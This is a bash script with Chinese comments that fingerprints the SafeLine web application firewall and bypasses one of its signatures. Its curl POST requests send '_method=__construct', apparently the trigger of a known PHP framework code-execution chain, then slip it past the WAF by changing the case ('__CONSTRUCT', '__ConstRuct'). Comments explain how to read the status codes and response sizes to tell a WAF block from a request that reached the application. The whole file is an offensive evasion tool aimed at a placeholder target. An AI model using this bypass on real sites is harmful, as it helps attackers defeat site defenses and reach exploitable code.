#!/usr/bin/env bash
# SafeLine WAF 判别 + 大小写签名绕过
# 用法: bash safeline_case_bypass.sh https://TARGET /probe
set -u
# ---- 参数检查 ----
if [ $# -lt 1 ]; then printf '用法: ./safeline_case_bypass.sh <https://TARGET> [probe-path]\n' >&2; exit 1; fi
T="${1:-https://TARGET}"; P="${2:-/zzz}"; J=/tmp/sl_$$.jar; rm -f $J
probe(){ # $1=label $2=extra curl args
  local lbl="$1"; shift
  local out; out=$(curl -sk -c $J -b $J --max-time 20 "$@" \
      -o /tmp/sl_body.$$ -w '%{http_code} %{size_download}' "$T$P")
  printf '%-42s => %s\n' "$lbl" "$out"; sleep 20
}
echo "== 1. 基线：benign 请求应透传到应用层 =="
probe "GET (no payload)"            -X GET
probe "POST a=1"                    -X POST -d 'a=1'
probe "POST _method=foo"            -X POST -d '_method=foo'
probe "POST x=__construct"          -X POST -d 'x=__construct'

echo "== 2. 签名命中：402/403 = WAF 规则模式（不是限速） =="
probe "POST _method=__construct"    -X POST -d '_method=__construct'
probe "POST _method=__constr%75ct"  -X POST -d '_method=__constr%75ct'

echo "== 3. 大小写绕过（PHP 方法名大小写不敏感） =="
probe "POST _method=__CONSTRUCT"    -X POST -d '_method=__CONSTRUCT'
probe "POST _method=__ConstRuct"    -X POST -d '_method=__ConstRuct'

# 判读：
#   403 + 322B  = SafeLine 拦截（文案统一是 frequency too high，别被误导）
#   403 + 146B  = nginx 原生 deny（.php/.env 等扩展名规则）
#   404/其他应用页 = 已透传到应用层
